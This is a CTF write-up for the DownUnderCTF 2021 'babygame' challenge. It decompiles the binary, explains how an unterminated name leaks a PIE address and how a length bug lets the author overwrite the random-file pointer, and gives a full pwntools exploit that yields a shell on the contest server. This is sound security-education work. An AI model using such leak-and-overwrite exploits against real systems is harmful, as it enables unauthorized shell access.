# DownUnderCTF 2021

## babygame

> 100
> 
> Not your typical shell game...
> 
> Admin note: the server runs in a restricted environment where some of your favourite files might not exist. If you need a file for your exploit, use a file you know definitely exists (the binary tells you of at least one!)
>
> Author: grub
>
> `nc pwn-2021.duc.tf 31907`
>
> [`babygame`](babygame)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _global-variable-overwrite_


## Summary

Leak a global address with an unterminated string, then overwrite said global with an address to a path to a predictable "urandom" to then "guess" the number and get a shell.

> Some bitched this was _guessy_.  This was not _guessy_ at all, they were just lazy.  The _Admin note_ above was caving into the demands of the lazy.

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Partial RELRO = GOT overwrite; Otherwise all mitigations in place.


### Decompile with Ghidra   

```c
void main(EVP_PKEY_CTX *param_1)
{
  int iVar1;
  
  init(param_1);
  puts("Welcome, what is your name?");
  read(0,NAME,0x20);
  RANDBUF = "/dev/urandom";
  do {
    while( true ) {
      while( true ) {
        print_menu();
        iVar1 = get_num();
        if (iVar1 != 0x539) break;
        game();
      }
      if (iVar1 < 0x53a) break;
LAB_0010126c:
      puts("Invalid choice.");
    }
    if (iVar1 == 1) {
      set_username();
    }
    else {
      if (iVar1 != 2) goto LAB_0010126c;
      print_username();
    }
  } while( true );
}
```

Both `NAME` and `RANDBUF` are globals (Ghidra actually color codes them to make them easy to spot, but I'm too lazy to take a screen shot and embed, so you'll have to see for yourself):

```
                     NAME 
001040a0 00 00 00        undefine...
         00 00 00 
         00 00 00 
                     RANDBUF 
001040c0 00 00 00        undefined8 0000000000000000h
         00 00 00 
         00 00
```

Notice that `NAME` is exactly `0x20` bytes before `RANDBUF`.  The `read(0,NAME,0x20);` does not terminate the input as a string, so if you input `0x20` (`32`) bytes and then read the string you can leak the value of `RANDBUF`.  `RANDBUF` is a pointer to a static string within the binary.  Using that pointer we can leak the process base address (PIE is enabled, so we need this leak).  If we know the process address, then we know the address of both `NAME` and `RANDBUF`.  We'll need this to win the `game`:

```
void game(void)
{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen(RANDBUF,"rb");
  fread(&local_14,1,4,__stream);
  printf("guess: ");
  iVar1 = get_num();
  if (iVar1 == local_14) {
    system("/bin/sh");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

`game` will open `RANDBUF` (set to `/dev/urandom` in `main`) and read 4 bytes.  You have to correctly guess the 4 bytes (2<sup>32</sup> possibilities) to win the game.

To _game_ the system we need to change `RANDBUF` to point to a string that is a file we know the contents of, or at least the first 4 bytes.  From the previous challenges we know the flag is `./flag.txt` and the first 4 bytes will be `DUCT`.  Other obvious options would be `./babygame` or `/bin/sh` (both have the same standard 4-byte ELF header).  To make this change we'll have to use:

```
void set_username(void)
{
  FILE *__stream;
  size_t __n;
  
  puts("What would you like to change your username to?");
  __stream = stdin;
  __n = strlen(NAME);
  fread(NAME,1,__n,__stream);
  return;
}
```

The bug here is that instead of limiting the input to `0x20` bytes like the initial `read` from `main`, it is limited by the length of the current `NAME`, which will be `0x20` + `6` (remember x86_64 address are usually 48-bits with `\0\0` as the most significant bytes) bytes if we started with a `0x20` (`32`) byte name and did not terminate with a null.

We have all the bits we need to exploit this challenge.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babygame')

if args.REMOTE:
    p = remote('pwn-2021.duc.tf', 31907)
else:
    p = process(binary.path)

# send 32 byte name to leak address of binary
p.sendafter(b'?\n',32 * b'A')

# get binary address
p.sendlineafter(b'> ',b'2')
p.recv(32)
binary.address = u64(p.recv(6) + b'\0\0') - binary.search(b'/dev/urandom').__next__()
log.info('binary.address: ' + hex(binary.address))

# point RANDBUF to NAME; set NAME to ./flag.txt; we know flag starts with DUCT
p.sendlineafter(b'> ',b'1')

payload  = b''
payload += b'./flag.txt\0'
payload += (32 - len(payload)) * b'A'
payload += p64(binary.sym.NAME)[:6]

p.sendafter(b'?\n',payload)

# get shell
p.sendlineafter(b'> ',b'1337')
p.sendlineafter(b'guess: ',str(u32(b'DUCT')).encode())
p.interactive()
```

From top down, first we'll send `32` (`0x20`) bytes without a newline (hence `sendafter` vs `sendlineafter`).

Then we'll print the name to leak a binary address and compute the base.

Next we'll change our name to `./flag.txt\0` + enough garbage to get us to `RANDBUF` and set that pointer to point to `NAME`.

Finally, to get a shell we'll enter the magic number `1337` (see `main`), then send the bytes `DUCT` as an integer since that is what `get_num` expects.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2021/babygame/babygame'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-2021.duc.tf on port 31907: Done
[*] binary.address: 0x55ab1e260000
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{whats_in_a_name?_5aacfc58}
```
